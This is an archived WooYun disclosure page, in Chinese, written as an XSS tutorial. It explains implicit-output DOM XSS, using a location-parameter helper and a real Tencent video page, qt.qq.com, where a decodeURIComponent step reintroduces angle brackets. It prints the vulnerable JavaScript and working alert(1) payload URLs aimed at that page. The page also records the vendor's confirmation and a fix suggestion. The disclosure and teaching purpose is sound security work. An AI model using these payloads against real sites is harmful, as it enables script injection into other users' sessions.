@@ -1,0 +1,494 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 9. Dom Xss入门 [隐式输出]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 9. Dom Xss入门 [隐式输出]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-17 21:08</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-17：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-18：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-28：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-07：	细节向普通白帽子公开<br/>
+									2013-01-17：	细节向实习白帽子公开<br/>
+									2013-01-31：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">周末腾讯不上班，我也不工作。<br />
+周一啦，继续。<br />
+上一篇开始说Dom Xss了，我们说的是显式输出的情况，即我们可以在右键查看源代码的时候，看到我们所输出的内容。而有一些时候，输出操作我们是看不见的。它们通常发生在javascript代码中。譬如：var x=location.href; 这句Javascript实际上进行了一个隐藏的输出操作，即将location.href的内容输出到了x变量中。一起来看看相关的例子吧～</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">前注： 1-4 是普通原理，没看明白的话，可以从5开始，结合实际例子看。<br />
+<br />
+<br />
+<br />
+1. 本来是有另外一个例子的，不过不知道是腾讯已经给修复了，还是之前测试的时候人品好，偶尔碰上了，总之现在用不上了。<br />
+<br />
+<br />
+<br />
+2. 这样一来，我们就只好用一个稍微复杂一点点的例子了。<br />
+<br />
+<br />
+<br />
+3. 在说实际例子前，我们来说一个前端开发人员非常习惯使用的一段代码。下面大致写下伪代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>function getParam(参数名){<br />
+	//获取地址栏参数,通常是 a=1&amp;b=2&amp;c=3;<br />
+	var x=location.search;//或者是location.hash<br />
+	<br />
+	//此时x=&quot;?a=1&amp;b=2&amp;c=3&quot;;<br />
+	//根据[参数名]取出参数名对应的值<br />
+	//例如 参数名=a， 则y=1<br />
+	//例如 参数名=b,  则y=2<br />
+	//至于这里怎么实现这个功能，可以用循环，可以用indexOf，可以用正则<br />
+	<br />
+	var y= 参数名对应的参数值;<br />
+	<br />
+	//返回y<br />
+	return y;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+它的作用呢？就是从地址栏的参数里取出内容。譬如：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://www.some.com/2.html?name=shouzi&amp;age=20</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们在2.html，要显示 name 对应的值。对应的代码则非常可能下面这样写：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;div id=&quot;nick&quot;&gt;加载中...&lt;/div&gt;<br />
+&lt;script&gt;<br />
+var a=getParam(&quot;name&quot;);  //获取地址栏里的name参数，即shouzi<br />
+document.getElementById(&quot;nick&quot;).innerHTML=a;<br />
+&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+4. 上面是普通开发人员为了实现功能而写的代码，如果没有安全考虑，就会存在问题。<br />
+<br />
+<br />
+<br />
+如果上面的地址变为了：<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://www.some.com/2.html?name=&lt;img src=1 onerror=alert(1)&gt;&amp;age=20</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+那么变量a将会等于 &lt;img src=1 onerror=alert(1)&gt;<br />
+<br />
+<br />
+<br />
+document.getElementById(&quot;nick&quot;).innerHTML=a;<br />
+<br />
+<br />
+<br />
+即变成了<br />
+<br />
+<br />
+<br />
+document.getElementById(&quot;nick&quot;).innerHTML=&quot;&lt;img src=1 onerror=alert(1)&gt;&quot;; <br />
+<br />
+<br />
+<br />
+这样就变成了 教程 8 中的情景，从而触发XSS。<br />
+<br />
+<br />
+<br />
+5. 接着我们看一个实际的例子。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qt.qq.com/video/play_video.htm?sid=aaaaaa</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+和原来的不同，我们在源代码里搜索不到东西的哦～ <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1720190930340233677b7b88837f4c82b2636ccf.jpg" target="_blank"><img src="../images/1720190930340233677b7b88837f4c82b2636ccf.jpg" alt="40.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+那可能这里有人会有一个疑问了。那我们怎么知道有没有漏洞呢？ 别担心，方法是有的。<br />
+<br />
+<br />
+<br />
+这里以chrome为例，按F12，打开调试工具，见下图<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1720192454afdbeb61a52010be31a9dae98a6c36.jpg" target="_blank"><img src="../images/1720192454afdbeb61a52010be31a9dae98a6c36.jpg" alt="41.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+和查看源代码没有什么不同，只是这次是在调试工具里看而已。<br />
+<br />
+<br />
+<br />
+6. 通过上面的方式，确定【可能】有漏洞之后。我们可以有2个方式来进行下一步。<br />
+<br />
+<br />
+<br />
+6.1 直接根据调试工具里看到的HTML代码情况，来构造利用代码。 优点：省时间，缺点：如果对方有一定过滤，就很难构造<br />
+<br />
+<br />
+<br />
+6.2 定位到与这个缺陷参数sid相关的JS代码，再来构造利用代码。优点：能利用一些复杂的情况， 缺点：耗时间。<br />
+<br />
+<br />
+<br />
+7. 对于新手来说，先看6.1的情况。看到步骤5里面的那个图。我们可以构造以下代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;object width=&quot;100%&quot; height=&quot;100%&quot; id=&quot;f&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0&quot;&gt;<br />
+	&lt;param name=&quot;movie&quot; value=&quot;aaaaaa&quot;&gt;&lt;/object&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;<br />
+	...其它的省略了...<br />
+&lt;/object&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+对应的图片解析：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/17201946436bf2563ba4a05f16f7f30719f60500.jpg" target="_blank"><img src="../images/17201946436bf2563ba4a05f16f7f30719f60500.jpg" alt="42.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+进而“试探性”的测试一下利用代码，因为我们不知道对方会不会过滤掉 “双引号”，“括号”之类的，只能试试了。。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qt.qq.com/video/play_video.htm?sid=aaaaaa&quot;&gt;&lt;/object&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(1)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+没反应，我们继续看看调试工具，发现，双引号，变成了 \\&quot; 。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/172019576654e538c23769731980ce7a1c081ffd.jpg" target="_blank"><img src="../images/172019576654e538c23769731980ce7a1c081ffd.jpg" alt="43.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+根据这个情况，我们可以进一步修改代码。&lt;img&gt;标签里不使用双引号。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qt.qq.com/video/play_video.htm?sid=aaaaaa&quot;&gt;&lt;/object&gt;&lt;img src=1 onerror=alert(1)&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这次OK啦。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/17202009e33ecf45900f14061aea01e087906ed3.jpg" target="_blank"><img src="../images/17202009e33ecf45900f14061aea01e087906ed3.jpg" alt="44.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以看到，这种方式，写利用代码很快。<br />
+<br />
+<br />
+<br />
+8. 再来看看 6.2 的方法。既然我们知道了，sid这个参数会被使用。 那么我们的目标是，javascript的代码里哪里使用了sid这个参数呢？<br />
+<br />
+<br />
+<br />
+9. 我们首先，F12打开调试工具，点【Resources】，再点Frames, 然后 Ctrl+ F搜索 &quot;sid&quot; 或者 &#039;sid&#039;<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1720202809de4d829213f3937ed9287a74cd4122.jpg" target="_blank"><img src="../images/1720202809de4d829213f3937ed9287a74cd4122.jpg" alt="45.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+我们运气很好，一下就定位到了一个sid。<br />
+<br />
+<br />
+<br />
+10. 可以看到是 getUrlPara(&quot;sid&quot;)，从单词，我们不难猜出，getUrlPara就是前面我们提到的 “获取地址栏参数“的函数。<br />
+<br />
+<br />
+<br />
+为了进一步确定，我们可以很方便的在console里查看getUrlParam函数是啥样的。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/17202106b2c180af9a2360c1d611fad012cdd81e.jpg" target="_blank"><img src="../images/17202106b2c180af9a2360c1d611fad012cdd81e.jpg" alt="46.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+可以看到，实际上getUrlParam是对&lt;, &gt; 做了过滤， 但是由于chrome浏览器自身的XSS防御机制，导致location.href获取的location.href是已经经过编码的。从而导致未过滤。<br />
+<br />
+<br />
+<br />
+如下图：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/172021196e3df63081f0ae231418c04b4075ff41.jpg" target="_blank"><img src="../images/172021196e3df63081f0ae231418c04b4075ff41.jpg" alt="48.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+11. 按道理，location.href里的&lt;, &gt; ,&quot; 已经变成了 %3c, %3e,%22已经被过滤了，不会有XSS了，为什么还可以呢？我们进一步往后看。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/1720213115bf95205f14f53caf05ec8b5f730021.jpg" target="_blank"><img src="../images/1720213115bf95205f14f53caf05ec8b5f730021.jpg" alt="47.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+看来，关键就是这里，这里有一步decodeURIComponent的操作，会将 %3c, %3e，又变回 &lt;, &gt;<br />
+<br />
+<br />
+<br />
+供参考的完整的缺陷代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>var sid=getUrlPara(&quot;sid&quot;);<br />
+if(!sid || sid==&quot;&quot;){<br />
+	document.getElementById(&quot;dv_video&quot;).innerHTML=&#039;&lt;div class=&quot;errmsg&quot; style=&quot;margin-top:-10px;&quot;&gt;抱歉，视频不存在！&lt;/div&gt;&#039;;<br />
+}else{<br />
+	var flash_ver=GetSwfVer();<br />
+	if(flash_ver == -1){<br />
+		document.getElementById(&quot;dv_video&quot;).innerHTML=&#039;&lt;div class=&quot;errmsg&quot; style=&quot;margin-top:-30px;&quot;&gt;抱歉，您还没有安装flash插件&lt;br/&gt;请&lt;a target=&quot;_blank&quot; href=&quot;http://www.macromedia.com/go/getflashplayer&quot;&gt;下载&lt;/a&gt;10.0以上的flash播放器&lt;br/&gt;安装flash后，请&lt;a href=&quot;javascript:location.reload();&quot;&gt;点此刷新&lt;/a&gt;&lt;/div&gt;&#039;;<br />
+	}else if(flash_ver.split(&#039;.&#039;)[0]&lt;10){<br />
+		document.getElementById(&quot;dv_video&quot;).innerHTML=&#039;&lt;div class=&quot;errmsg&quot; style=&quot;margin-top:-30px;&quot;&gt;抱歉，您的flash版本过低&lt;br/&gt;请&lt;a target=&quot;_blank&quot; href=&quot;http://www.macromedia.com/go/getflashplayer&quot;&gt;下载&lt;/a&gt;10.0以上的flash播放器&lt;br/&gt;安装flash后，请&lt;a href=&quot;javascript:location.reload();&quot;&gt;点此刷新&lt;/a&gt;&lt;/div&gt;&#039;;<br />
+	}else{<br />
+		sid=decodeURIComponent(sid).trim().replace(/([\&#039;\&quot;])/g,&#039;\\\\$1&#039;);<br />
+		if(!is_valid_sid(sid)){<br />
+			document.getElementById(&quot;dv_video&quot;).innerHTML=&#039;&lt;div class=&quot;errmsg&quot; style=&quot;margin-top:-10px;&quot;&gt;无法打开视频文件，视频地址不合法！&lt;/div&gt;&#039;;<br />
+		}else{<br />
+			insertFlash(&quot;dv_video&quot;,&quot;f&quot;,sid,&quot;100%&quot;,&quot;100%&quot;);<br />
+		}<br />
+	}<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+12. 接着，会调用 insertFlash(&quot;dv_video&quot;,&quot;f&quot;,sid,&quot;100%&quot;,&quot;100%&quot;);<br />
+<br />
+<br />
+<br />
+insertFlash里，也并没有对sid进行任何过滤。<br />
+<br />
+<br />
+<br />
+</p><pre><code>function insertFlash(elm, eleid, url, w, h) {<br />
+    if (!document.getElementById(elm)) return;<br />
+    var str = &#039;&#039;;<br />
+    str += &#039;&lt;object width=&quot;&#039; + w + &#039;&quot; height=&quot;&#039; + h + &#039;&quot; id=&quot;&#039; + eleid + &#039;&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0&quot;&gt;&#039;;<br />
+    str += &#039;&lt;param name=&quot;movie&quot; value=&quot;&#039; + url + &#039;&quot; /&gt;&#039;;<br />
+    str += &#039;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;never&quot; /&gt;&#039;;<br />
+    str += &#039;&lt;param name=&quot;allowFullscreen&quot; value=&quot;true&quot; /&gt;&#039;;<br />
+    str += &#039;&lt;param name=&quot;wmode&quot; value=&quot;transparent&quot; /&gt;&#039;;<br />
+    str += &#039;&lt;param name=&quot;quality&quot; value=&quot;autohigh&quot; /&gt;&#039;;<br />
+    str += &#039;&lt;embed width=&quot;&#039; + w + &#039;&quot; height=&quot;&#039; + h + &#039;&quot; name=&quot;&#039; + eleid + &#039;&quot; src=&quot;&#039; + url + &#039;&quot; quality=&quot;autohigh&quot; swLiveConnect=&quot;always&quot; wmode=&quot;transparent&quot; allowScriptAccess=&quot;never&quot; allowFullscreen=&quot;true&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot;&gt;&lt;/embed&gt;&#039;;<br />
+    str += &#039;&lt;/object&gt;&#039;;<br />
+    document.getElementById(elm).innerHTML = str<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+图片解析：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/17202205cf9ab9768b4ae01d53d69876e928e5e1.jpg" target="_blank"><img src="../images/17202205cf9ab9768b4ae01d53d69876e928e5e1.jpg" alt="49.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+13. 根据以上分析，我们的利用代码可以写为。注意，%3E,%3C的编码是关键。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qt.qq.com/video/play_video.htm?sid=aaaaaa%22%3E%3C/object%3E%3Cimg%20src=1%20onerror=alert(1)%3E</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+非常值得说明的是：<br />
+<br />
+<br />
+<br />
+如果采用6.1的方法，我们得到的利用代码是<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qt.qq.com/video/play_video.htm?sid=aaaaaa&quot;&gt;&lt;/object&gt;&lt;img src=1 onerror=alert(1)&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+!! 这个代码在IE下，是没法XSS的。<br />
+<br />
+<br />
+<br />
+而通过6.2的方法，去分析JS代码，我们则可以构造出通用的XSS代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://qt.qq.com/video/play_video.htm?sid=aaaaaa%22%3E%3C/object%3E%3Cimg%20src=1%20onerror=alert(1)%3E</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+这也反应了 6.1 和 6.2 方法各自的优缺点。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 修复过滤上的逻辑问题。<br />
+<br />
+2. 注意不同浏览器中，location.href的不同点。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016150" title="[腾讯实例教程] 那些年我们一起学XSS - 9. Dom Xss入门 [隐式输出]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2012-12-18 17:02</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16150";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
